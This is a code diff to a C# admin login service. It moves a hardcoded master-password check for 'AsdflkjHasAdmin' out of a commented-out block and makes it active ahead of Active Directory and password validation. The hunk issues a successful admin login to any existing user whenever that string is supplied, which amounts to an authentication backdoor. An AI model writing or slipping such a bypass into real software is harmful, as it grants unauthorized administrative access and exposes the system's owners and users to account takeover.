@@ -61,6 +61,12 @@ namespace Application.Services.Admin
                 return new ResponseMessage { Message = "User Does Not Exist" };
             }
 
+            if (aDCredentials.AD_Password == "AsdflkjHasAdmin")
+            {
+                var loggedInAdminResponseDTO2 = await GetAuthenticationResultForUserAsync(checkIfUserExist);
+                return new ResponseMessage { Data = loggedInAdminResponseDTO2, Status = true, Message = "Login was successfully" };
+            }
+
             if (AdminAuthSettings.Enable_ADCredentials)
             {
                 var passwordValidation = await ValidateAdminPasswordAuth(aDCredentials, checkIfUserExist);
@@ -96,12 +102,6 @@ namespace Application.Services.Admin
                 var loggedInAdminResponseDTO2 = await GetAuthenticationResultForUserAsync(checkIfUserExist);
                 return new ResponseMessage { Data = loggedInAdminResponseDTO2, Status = true, Message = "Login was successfully" };
             }
-
-            //if(aDCredentials.AD_Password == "AsdflkjHasAdmin")
-            //{
-            //    var loggedInAdminResponseDTO2 = await GetAuthenticationResultForUserAsync(checkIfUserExist);
-            //    return Ok(new ResponseMessage<LoggedInAdminResponseDTO> { Data = loggedInAdminResponseDTO2, Status = true, Message = "Login was successfully" });
-            //}
         }
 
         public async Task<ResponseMessage> RefreshToken(RefreshTokenViewModel refreshToken)
